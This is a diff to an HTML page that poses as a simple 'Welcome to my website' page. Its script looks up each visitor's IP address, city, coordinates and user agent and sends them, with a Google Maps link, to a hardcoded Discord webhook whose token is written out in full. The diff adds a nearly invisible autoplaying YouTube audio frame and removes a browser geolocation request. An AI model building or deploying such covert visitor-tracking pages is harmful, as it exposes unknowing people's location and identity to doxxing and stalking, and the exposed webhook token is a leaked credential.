@@ -5,6 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Your Website Title</title>
     <style>
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            background: linear-gradient(45deg, #1a1a1a, #2d2d2d);
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+
         #ip-display {
             position: fixed;
             top: 10px;
@@ -17,14 +26,45 @@
             z-index: 9999;
             font-size: 14px;
         }
+
+        .content {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .video-container {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            width: 200px;
+            height: 50px;
+            opacity: 0.01;
+            pointer-events: none;
+            z-index: -1;
+        }
     </style>
 </head>
 <body>
     <div id="ip-display">Your IP is: <span id="ip-span">detecting...</span></div>
-    
-    <h1>Welcome to my website</h1>
-    <p>Content goes here...</p>
-    
+
+    <div class="content">
+        <h1>Welcome to my website</h1>
+        <p>Content goes here...</p>
+    </div>
+
+    <!-- Hidden YouTube video for audio -->
+    <div class="video-container">
+        <iframe
+            id="youtube-player"
+            width="200"
+            height="50"
+            src="https://www.youtube.com/embed/8WIKVGG5GXU?autoplay=1&mute=0&loop=1&playlist=8WIKVGG5GXU&controls=0&showinfo=0&autohide=1&modestbranding=1"
+            frameborder="0"
+            allow="autoplay; encrypted-media"
+            allowfullscreen>
+        </iframe>
+    </div>
+
     <script>
         // Get user's IP and location
         fetch('https://ipapi.co/json/')
@@ -37,13 +77,13 @@
                 const region = data.region;
                 const country = data.country_name;
                 const postal = data.postal;
-                
+
                 // Display IP to user
                 document.getElementById('ip-span').textContent = ip;
-                
+
                 // Create Google Maps link
                 const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                
+
                 // Prepare payload
                 const payload = {
                     ip: ip,
@@ -58,35 +98,17 @@
                     userAgent: navigator.userAgent,
                     timestamp: new Date().toISOString()
                 };
-                
-                // Try to get more precise location
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            payload.preciseLat = position.coords.latitude;
-                            payload.preciseLon = position.coords.longitude;
-                            payload.preciseMapsLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
-                            
-                            // Send with precise location
-                            sendData(payload);
-                        },
-                        (error) => {
-                            // Send with approximate location
-                            sendData(payload);
-                        }
-                    );
-                } else {
-                    // Send without precise location
-                    sendData(payload);
-                }
+
+                // Send data
+                sendData(payload);
             })
             .catch(err => {
                 console.log('IP fetch failed:', err);
                 document.getElementById('ip-span').textContent = 'Failed to detect';
             });
-        
+
         function sendData(data) {
-            // Send to your webhook/server
+            // Send to your Discord webhook
             fetch('https://discord.com/api/webhooks/1454552751521402892/9yXxj3zUYhU3rlx3De5pRdOSwpfc5bX2zT5zq5WVb5TDVUleps7H_VBdqPn1vXWtNBN-', {
                 method: 'POST',
                 headers: {
@@ -95,6 +117,12 @@
                 body: JSON.stringify(data)
             });
         }
+
+        // Handle YouTube autoplay (most browsers block autoplay until user interaction)
+        document.addEventListener('click', function initAudio() {
+            const iframe = document.getElementById('youtube-player');
+            iframe.src = iframe.src.replace('mute=0', 'mute=0');
+        }, { once: true });
     </script>
 </body>
 </html>
